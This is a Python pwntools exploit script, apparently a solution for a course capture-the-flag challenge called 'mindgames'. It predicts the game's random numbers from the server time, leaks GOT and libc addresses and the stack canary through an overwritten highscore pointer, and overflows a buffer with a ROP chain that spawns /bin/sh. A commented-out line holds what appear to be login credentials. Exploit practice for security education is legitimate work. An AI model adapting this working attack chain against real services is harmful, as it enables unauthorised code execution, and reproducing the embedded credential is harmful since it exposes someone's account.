#!/usr/bin/python3

from pwn import *

from dateutil import parser
import datetime, time
import getpass


# Choose a file

value = 0

while value not in [6,7,8]:
    try:
        value = int(input("Which binary do you want to exploit? 133[6,7,8]: "))
        if value not in [6,7,8]:
            print("Value not in [6,7,8]")
    except ValueError:
        print("This is not a number/valid choice.")


filename = f'../challenge_files/mindgames_133{value}'
PORT = f'4133{value}'

REMOTE = input("Local or remote [L/r]? ").strip() or 'L'

print(REMOTE)
if REMOTE in ['R', 'r']:
    REMOTE = True
else:
    REMOTE = False


context.arch = 'amd64'
context.log_level = 'DEBUG'
#context.log_level = 'INFO'

from ctypes import CDLL

elf = ELF(filename)


if REMOTE:

    r = remote("localhost", PORT)

    #libraryname = '../files/libc.so.6'
    libraryname = './libc.so'
    #libraryname = '/usr/lib/libc.so.6'
    TIMEOFFSET_FROM_SERVER = 2
    # OFFSET for arch boxes
    canary_offset = 8 * 48 + 1
    # OFFSET for ubuntu boxes
    canary_offset = 8 * 46 + 1 


else:
    canary_offset = 8 * 108 + 1
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    r = process(elf.path)
    #r = gdb.debug(elf.path)
    libraryname = '/usr/lib/libc.so.6'
    TIMEOFFSET_FROM_SERVER = 0

libc = CDLL(libraryname)

#r.sendline('inetsec001:iehephux')


junk = r.readuntil("It's ")
data = r.readuntil( ' and' )
r.readline()

#date = datetime.strptime('2018-06-06 15:39:19')
date = parser.parse(data) + datetime.timedelta(hours=TIMEOFFSET_FROM_SERVER)
now =  int((time.mktime( date.timetuple() )))
libc.srand( now )
junk = r.readuntil('?')
#print(junk)
libc.rand() # We need to do one call to ignore the name selection
score = (libc.rand() % 32) + 1
#print "Highscore: ", score


# We can do this by overwriting the least significant byte from highscore to get got entries
def leak_got_entry( leastSignificantByte, length ):
    with log.progress('Leaking entry from got') as plog:
        output = b''
        while len(output) < length:
            play_game(b'A'*32 + b'\x00' * 8 + p8( leastSignificantByte + len(output) ))
            data = show_highscores()
    #        print(data)
            retval = data.split(b'by \t ')[1].split(b'\nWhat')[0]
            output += retval or b'\x00'
            plog.status(str(output))
        plog.success(str(output))
    return output[:length]


def leak( address, length ):
    output = b''
    with log.progress('Leaking {} bytes from 0x{:016x}'.format(length, address)) as plog:
        while len(output) < length:
            play_game(b'A'*32 + b'\x00' * 8 + p64( address + len(output) ))
            data = show_highscores()
            #print(data)
            retval = data.split(b'by \t ')[1].split(b'\nWhat')[0]
            output += retval or b'\x00'
            plog.status( str(output) )
        plog.success( str(output) )
    return output[:length]


@pwnlib.memleak.MemLeak.String
def memleak( address ):
    play_game(b'A'*32 + b'\x00' * 8 + p64( address ))
    data = show_highscores()
    #print(data)
    retval = data.split(b'by \t ')[1].split(b'\nWhat')[0]
    return retval


def play_game(name):
    r.sendline('2')
    for x in range(score+1):
        r.readuntil('>')
        random = libc.rand()
        r.sendline(str(random))

    # We want to lose now
    random = libc.rand()+1
    r.sendline(str(random))
    junk = r.readuntil('your name: ')
    #print(junk)
    r.send(name)
    data = r.readuntil('>', timeout=1)

def show_highscores():
    r.sendline('1')
    data = r.readuntil('>')
    return data

data = r.readuntil('>')
rop = ROP( elf )

setvbuf_address =  u64(leak_got_entry(elf.got['setvbuf'] & 0xff, 8))
log.info("Got libc address of setvbuf: {}".format(hex(setvbuf_address)))


libc_pwn = ELF(libraryname)
libc_pwn.address = setvbuf_address - libc_pwn.symbols['setvbuf']
log.info("Libc base at: {}".format(hex(libc_pwn.address)))

environ_address =  u64(leak(libc_pwn.symbols['__environ'], 8))
log.info("Stack pointer from __environ: {}".format(hex(environ_address)))


## Found this by leaking data starting from __environ address and checking canary value in gdb to verify
## Values around canary are followed by x86_64..something
#for x in range(46, 49):
#    log.info(f"Leaking entry {x}")
#    canary = u64(leak(environ_address + 8 * x + 1, 8))
#    log.info("Canary value: {}".format(hex(canary)))


canary = u64(leak(environ_address + canary_offset, 8))
log.info("Canary value: {}".format(hex(canary)))

## Last byte of canary is '\x00' so it always has a string terminator in there
canary = canary & 0xffffffffffffff00

rop = ROP(libc_pwn)
rop.execv(next(libc_pwn.search(b'/bin/sh')), 0)

play_game(b'A' * (256 + 8) + p64(canary) + b'B' * 8 + bytes(rop))
r.interactive()
